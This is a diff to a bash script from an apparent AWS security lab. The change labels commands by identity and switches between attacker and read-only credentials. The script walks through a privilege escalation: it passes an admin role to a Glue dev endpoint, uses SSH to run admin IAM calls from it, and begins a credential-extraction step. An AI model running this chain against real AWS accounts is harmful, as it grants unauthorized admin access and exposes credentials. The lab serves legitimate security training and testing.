@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -70,6 +72,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -80,23 +91,33 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -106,17 +127,19 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify lack of admin permissions
+# [EXPLOIT] Step 4: Verify lack of admin permissions
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -135,7 +158,8 @@ SSH_PUBLIC_KEY=$(cat "${SSH_KEY_PATH}.pub")
 echo "Generated SSH key pair at: $SSH_KEY_PATH"
 echo -e "${GREEN}✓ SSH key pair generated${NC}\n"
 
-# Step 6: Create Glue Dev Endpoint with admin role
+# [EXPLOIT] Step 6: Create Glue Dev Endpoint with admin role
+use_starting_creds
 echo -e "${YELLOW}Step 6: Creating Glue Dev Endpoint with admin role${NC}"
 echo "This is the privilege escalation vector - passing the admin role to Glue..."
 ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
@@ -143,7 +167,7 @@ echo "Target Role ARN: $ROLE_ARN"
 echo "Dev Endpoint Name: $DEV_ENDPOINT_NAME"
 echo ""
 
-show_attack_cmd "aws glue create-dev-endpoint --endpoint-name \"$DEV_ENDPOINT_NAME\" --role-arn \"$ROLE_ARN\" --public-key \"$SSH_PUBLIC_KEY\" --glue-version \"1.0\" --number-of-nodes 2 --output json"
+show_attack_cmd "Attacker" "aws glue create-dev-endpoint --endpoint-name \"$DEV_ENDPOINT_NAME\" --role-arn \"$ROLE_ARN\" --public-key \"$SSH_PUBLIC_KEY\" --glue-version \"1.0\" --number-of-nodes 2 --output json"
 aws glue create-dev-endpoint \
     --endpoint-name "$DEV_ENDPOINT_NAME" \
     --role-arn "$ROLE_ARN" \
@@ -161,7 +185,8 @@ else
 fi
 echo ""
 
-# Step 7: Wait for endpoint to be ready
+# [OBSERVATION] Step 7: Wait for endpoint to be ready
+use_readonly_creds
 echo -e "${YELLOW}Step 7: Waiting for Dev Endpoint to be ready${NC}"
 echo -e "${BLUE}This may take 5-10 minutes. The endpoint needs to provision workers...${NC}"
 echo "Status checks will occur every 30 seconds"
@@ -172,7 +197,7 @@ WAIT_COUNT=0
 ENDPOINT_STATUS=""
 
 while [ $WAIT_COUNT -lt $MAX_WAIT ]; do
-    show_cmd "aws glue get-dev-endpoint --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.Status' --output text"
+    show_cmd "ReadOnly" "aws glue get-dev-endpoint --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.Status' --output text"
     ENDPOINT_STATUS=$(aws glue get-dev-endpoint \
         --endpoint-name "$DEV_ENDPOINT_NAME" \
         --query 'DevEndpoint.Status' \
@@ -200,9 +225,10 @@ if [ "$ENDPOINT_STATUS" != "READY" ]; then
     exit 1
 fi
 
-# Step 8: Get endpoint address
+# [OBSERVATION] Step 8: Get endpoint address
+use_readonly_creds
 echo -e "${YELLOW}Step 8: Retrieving Dev Endpoint connection details${NC}"
-show_cmd "aws glue get-dev-endpoint --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.PublicAddress' --output text"
+show_cmd "ReadOnly" "aws glue get-dev-endpoint --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.PublicAddress' --output text"
 ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
     --endpoint-name "$DEV_ENDPOINT_NAME" \
     --query 'DevEndpoint.PublicAddress' \
@@ -217,7 +243,9 @@ fi
 echo "Endpoint Address: $ENDPOINT_ADDRESS"
 echo -e "${GREEN}✓ Retrieved endpoint connection details${NC}\n"
 
-# Step 9: Connect to endpoint and verify admin access
+# [EXPLOIT] Step 9: Connect to endpoint and verify admin access
+# Note: SSH commands execute on the endpoint which runs with the admin role credentials.
+# No local AWS credential switch needed - the endpoint itself carries the admin role.
 echo -e "${YELLOW}Step 9: Connecting to Dev Endpoint via SSH and verifying admin access${NC}"
 echo "The Glue Dev Endpoint runs with the admin role's credentials..."
 echo "Executing: aws iam list-users --max-items 3"
@@ -239,7 +267,7 @@ else
 fi
 echo ""
 
-# Step 10: Demonstrate credential extraction
+# [EXPLOIT] Step 10: Demonstrate credential extraction
 echo -e "${YELLOW}Step 10: Extracting AWS credentials from the endpoint${NC}"
 echo "Retrieving the admin role credentials from the endpoint environment..."
 echo ""
